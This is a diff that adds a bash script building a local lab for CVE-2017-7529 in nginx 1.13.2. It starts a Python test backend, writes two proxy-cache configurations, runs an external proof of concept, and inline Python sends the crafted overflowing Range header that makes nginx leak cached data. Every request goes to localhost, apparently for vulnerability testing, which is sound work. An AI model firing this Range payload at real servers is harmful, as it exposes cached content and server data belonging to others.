@@ -1,0 +1,84 @@
+#!/usr/bin/env bash
+LAB="$HOME/nginx-poc-lab"
+POCLAB="/mnt/d/download/PoClab/PoCLab"
+kill "$(cat "$LAB/7529.pid" 2>/dev/null)" 2>/dev/null || true
+sleep 1
+cat >"$LAB/backend-7529.py" <<'PY'
+from http.server import BaseHTTPRequestHandler, HTTPServer
+BODY = b"AAAA test content for cache leak CVE-2017-7529\n"
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(BODY)))
+        self.send_header("Accept-Ranges", "bytes")
+        self.end_headers()
+        self.wfile.write(BODY)
+    def log_message(self, *a): pass
+HTTPServer(("127.0.0.1", 18081), H).serve_forever()
+PY
+cat >"$LAB/conf/7529-force.conf" <<EOF
+worker_processes 1;
+error_log $LAB/7529-error.log info;
+pid $LAB/7529.pid;
+events { worker_connections 64; }
+http {
+    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m max_size=100m inactive=60m use_temp_path=off;
+    upstream b { server 127.0.0.1:18081; }
+    server {
+        listen 17529;
+        location / {
+            proxy_cache c;
+            proxy_cache_valid 200 10m;
+            proxy_pass http://b;
+            add_header X-Cache-Status \$upstream_cache_status;
+        }
+    }
+}
+EOF
+cat >"$LAB/conf/7529-fr.conf" <<EOF
+worker_processes 1;
+error_log $LAB/7529-error.log info;
+pid $LAB/7529.pid;
+events { worker_connections 64; }
+http {
+    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m max_size=100m inactive=60m use_temp_path=off;
+    upstream b { server 127.0.0.1:18081; }
+    server {
+        listen 17529;
+        location / {
+            proxy_cache c;
+            proxy_cache_valid 200 10m;
+            proxy_force_ranges on;
+            proxy_pass http://b;
+            add_header X-Cache-Status \$upstream_cache_status;
+        }
+    }
+}
+EOF
+nohup python3 "$LAB/backend-7529.py" >/tmp/be7529.log 2>&1 &
+sleep 1
+for conf in 7529-force.conf 7529-fr.conf; do
+  echo "=== $conf ==="
+  kill "$(cat "$LAB/7529.pid" 2>/dev/null)" 2>/dev/null || true
+  sleep 1
+  rm -rf "$LAB/cache"/*
+  "$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/$conf"
+  curl -s http://127.0.0.1:17529/ >/dev/null
+  curl -s -D - -o /tmp/rng -H "Range: bytes=0-10" http://127.0.0.1:17529/ | head -8
+  echo "range_body_len=$(wc -c </tmp/rng)"
+  python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" http://127.0.0.1:17529/
+  echo "poc_exit=$?"
+  python3 <<PY
+import requests
+url="http://127.0.0.1:17529/"
+r=requests.get(url)
+cl=int(r.headers.get("Content-Length",0) or len(r.content))
+length=cl+623
+hdr={"Range":"bytes=-%d,-9223372036854776000"%length}
+r2=requests.get(url, headers=hdr)
+print("upstream_check", r2.status_code==206 and b"Content-Range" in r2.content, "status", r2.status_code, "len", len(r2.content))
+if r2.content!=r.content:
+    print("preview", repr(r2.content[:180]))
+PY
+done
